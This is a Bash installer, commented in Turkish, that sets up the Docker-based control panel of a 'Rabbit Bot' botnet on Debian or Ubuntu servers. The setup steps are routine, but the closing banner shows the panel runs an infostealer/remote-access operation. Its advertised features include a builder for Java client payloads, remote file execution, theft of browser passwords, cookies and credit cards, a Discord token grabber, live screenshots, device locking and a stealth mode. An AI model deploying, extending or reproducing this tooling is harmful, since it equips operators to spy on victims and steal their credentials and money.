#!/bin/bash

# =========================================================
#  RABBIT BOT / BOT CONTROL PANEL - AUTOMATED INSTALLER
#  Debian 12 (Bookworm) & Ubuntu Full Stack Setup
# =========================================================

set -e

# Renkler
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
NC='\033[0m' # No Color

clear
echo -e "${CYAN}==============================================================================${NC}"
echo -e "${CYAN}${BOLD}        RABBIT BOT CONTROL PANEL KURULUM SİHRİBAZI (DEBIAN & UBUNTU)       ${NC}"
echo -e "${CYAN}==============================================================================${NC}"

# Root kontrolü
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[ERROR] Bu betiği sudo veya root kullanıcısı olarak çalıştırmalısınız!${NC}"
  exit 1
fi

# Distro tespiti (Debian 12 / Ubuntu)
if [ -f /etc/os-release ]; then
    . /etc/os-release
    DISTRO_ID="${ID}"
    DISTRO_CODENAME="${VERSION_CODENAME}"
else
    DISTRO_ID="debian"
    DISTRO_CODENAME="bookworm"
fi

echo -e "${GREEN}[INFO] Algılanan sistem: ${DISTRO_ID} (${DISTRO_CODENAME})${NC}"

# 1. Paket listesi güncelleme ve temel bağımlılıklar (OpenJDK & Derleme Araçları Dahil)
echo -e "${YELLOW}[1/6] Paket listesi güncelleniyor ve bağımlılıklar yükleniyor...${NC}"
apt-get update -y
apt-get install -y curl wget git build-essential ca-certificates gnupg lsb-release iptables ufw jq openjdk-17-jdk-headless

# 2. Docker CE ve Docker Compose Plugin kurulumu
echo -e "${YELLOW}[2/6] Docker CE ve Docker Compose Plugin hazırlanıyor...${NC}"
install -m 0755 -d /etc/apt/keyrings

# Eski veya çakışan keyrings temizliği
rm -f /etc/apt/keyrings/docker.gpg /etc/apt/sources.list.d/docker.list

# Docker Resmi GPG Key ekleme
curl -fsSL "https://download.docker.com/linux/${DISTRO_ID}/gpg" | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
chmod a+r /etc/apt/keyrings/docker.gpg

# Repository ekleme
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/${DISTRO_ID} \
  ${DISTRO_CODENAME} stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null

apt-get update -y
apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

# docker-compose alias / fallback sağlama
if ! command -v docker-compose &> /dev/null; then
    echo '#!/bin/sh' > /usr/local/bin/docker-compose
    echo 'exec docker compose "$@"' >> /usr/local/bin/docker-compose
    chmod +x /usr/local/bin/docker-compose
fi

# 3. Docker servisini başlat ve aktif et
echo -e "${YELLOW}[3/6] Docker servisi başlatılıyor...${NC}"
systemctl daemon-reload
systemctl restart docker
systemctl enable docker

# 4. Proje dizini hazırlığı (/var/www/bot)
echo -e "${YELLOW}[4/6] Proje dizini (/var/www/bot) kuruluyor...${NC}"
mkdir -p /var/www/bot

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
if [ "$SCRIPT_DIR" != "/var/www/bot" ]; then
    cp -rn "$SCRIPT_DIR"/* /var/www/bot/ 2>/dev/null || true
    cp -rn "$SCRIPT_DIR"/.* /var/www/bot/ 2>/dev/null || true
fi
cd /var/www/bot

# Gerekli veri, upload ve Client Builder kaynak dizinlerini oluştur & senkronize et
mkdir -p /var/www/bot/backend/uploads
mkdir -p /var/www/bot/backend/screenshots
mkdir -p /var/www/bot/backend/sysinfo
mkdir -p /var/www/bot/backend/client

if [ -d "/var/www/bot/client" ]; then
    cp -rf /var/www/bot/client/* /var/www/bot/backend/client/ 2>/dev/null || true
fi

chmod -R 777 /var/www/bot/backend/uploads 2>/dev/null || true
chmod -R 777 /var/www/bot/backend/screenshots 2>/dev/null || true
chmod -R 777 /var/www/bot/backend/sysinfo 2>/dev/null || true
chmod -R 777 /var/www/bot/backend/client 2>/dev/null || true

# Temizlik: sunucuda eski node_modules veya dist varsa sil
rm -rf node_modules frontend/node_modules backend/node_modules dist frontend/dist backend/dist

# 5. Docker Konteynerleri Derle ve Başlat
echo -e "${YELLOW}[5/6] Docker Konteynerleri Derleniyor ve Başlatılıyor...${NC}"
docker compose down 2>/dev/null || true
docker compose build --no-cache
docker compose up -d

# Veritabanı ve servislerin ayağa kalkmasını bekle
echo -e "${GREEN}[INFO] Servislerin hazır olması bekleniyor (10sn)...${NC}"
sleep 10

# 6. Güvenlik Duvarı Port İzinleri (UFW / iptables)
echo -e "${YELLOW}[6/6] Güvenlik Duvarı Port İzinleri Düzenleniyor...${NC}"
if command -v ufw &> /dev/null; then
    ufw allow 80/tcp 2>/dev/null || true
    ufw allow 3434/tcp 2>/dev/null || true
    ufw allow 5000/tcp 2>/dev/null || true
    ufw allow 22/tcp 2>/dev/null || true
fi

# IP Tespiti
SERVER_IP=$(curl -s --max-time 5 https://api.ipify.org || curl -s --max-time 5 https://ifconfig.me || hostname -I | awk '{print $1}')

echo ""
echo -e "${CYAN}Konteyner Durumları:${NC}"
docker compose ps
echo ""

echo -e "${GREEN}"
echo "========================================================="
echo "       🎉 KURULUM BAŞARIYLA TAMAMLANDI! 🎉               "
echo "========================================================="
echo -e "${NC}"
echo -e "📌 ${CYAN}Web Paneli:${NC}         http://${SERVER_IP}"
echo -e "📌 ${CYAN}Bot API Portu:${NC}      http://${SERVER_IP}:3434"
echo -e "📌 ${CYAN}Varsayılan Kullanıcı:${NC} admin"
echo -e "📌 ${CYAN}Varsayılan Şifre:${NC}    admin123"
echo ""
echo -e "✨ ${BOLD}Aktif Özellikler:${NC}"
echo -e "   • İstemci Derleyici (Client Builder - Canlı Java JAR Derleme)"
echo -e "   • Dosya Yöneticisi (File Manager - İndir, Sil, Çalıştır)"
echo -e "   • Sistem Bilgisi (SysInfo - CPU, RAM, Diskler, Ağ, Donanım)"
echo -e "   • Tarayıcı Verileri (Passwords, Cookies, Credit Cards, History)"
echo -e "   • Discord Token Yakalayıcı (Discord Grabber)"
echo -e "   • Canlı Ekran Görüntüsü & Galeri (Live Screenshot Studio)"
echo -e "   • Cihaz Kilitleme & Kill Bot Özellikleri"
echo -e "   • Gizli Mod (Privacy / Stealth Mode)"
echo -e "   • 6 Farklı Dil Desteği (TR, EN, RU, ZH, AR, ES)"
echo ""
echo -e "${YELLOW}[!] Giriş yaptıktan sonra şifrenizi Ayarlar ekranından değiştirin!${NC}"
echo "========================================================="
